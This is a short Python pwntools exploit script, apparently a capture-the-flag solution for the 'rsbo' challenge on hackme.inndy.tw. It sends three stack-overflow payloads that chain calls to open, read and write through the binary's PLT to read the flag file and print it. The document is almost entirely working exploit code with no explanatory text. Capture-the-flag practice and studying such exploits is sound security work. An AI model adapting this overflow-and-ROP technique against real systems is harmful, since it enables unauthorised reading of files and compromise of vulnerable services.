from pwn import *
#context.log_level = 'debug'

#p = process('./rsbo',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7706)
elf = ELF('./rsbo')

write_plt = elf.plt['write']
open_plt = elf.plt['open']
read_plt = elf.plt['read']
start_addr = elf.symbols["_start"]
flag_addr = 0x080487D0
bss_addr = elf.bss()

#open('/home/ctf/flag',0)
payload = '\x00'*108 + p32(open_plt)
payload += p32(start_addr) + p32(flag_addr) + p32(0)
p.send(payload)

#read(3,bss,0x60)
payload = '\x00'*108 + p32(read_plt)
payload += p32(start_addr) + p32(3) + p32(bss_addr) + p32(0x60)
p.send(payload)

#write(1,bss,0x60)
payload = '\x00'*108 + p32(write_plt) + 'aaaa'
payload += p32(1) + p32(bss_addr) + p32(0x60)
p.send(payload)

flag = p.recvuntil('}')
print flag

p.close()
#p.interactive()
